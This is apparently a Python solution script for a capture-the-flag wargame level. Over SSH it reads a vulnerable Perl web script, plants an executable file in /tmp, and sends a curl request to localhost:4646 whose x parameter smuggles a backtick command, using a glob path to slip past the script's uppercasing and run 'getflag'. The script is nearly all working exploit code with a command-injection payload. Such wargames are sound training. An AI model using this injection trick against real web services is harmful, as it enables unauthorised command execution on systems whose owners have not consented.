import sys

sys.path.append("../..")

from utils.ssh import connect_by_previous, exec, save_token, sanitize_token
from utils.text import print_title, print_output

client = connect_by_previous()

file = exec(client, 'ls', title='Get files list')[0]
print_output(file)

output = exec(client, f'cat {file}', title='Read this file')
print_output(output)
print_title("It's perl script")
print_title('Web server works on localhost:4646')
print_title('Params x and y')
print_title('Turns params lowercase letter to uppercase')
print_title('Sanitize string (remove all after whitespace)')
print_title('And finally - execute command, break it!')

exec(client, "echo 'echo `getflag` > /tmp/token' > /tmp/TRICKY_THING", title='Create script (execute getflag)')

exec(client, "chmod +x /tmp/TRICKY_THING", title='Make it executable')

exec(client, "curl 'localhost:4646/level12.pl?x=`/*/TRICKY_THING`'",
     title='Send request and use globbing trick to execute our file passed to x param')

token_raw = exec(client, "cat /tmp/token", title='Check results')[0]
print_output(token_raw)
print_title("It's too easy, no magic, sorry")

token = sanitize_token(token_raw)
save_token(token)

client.close()
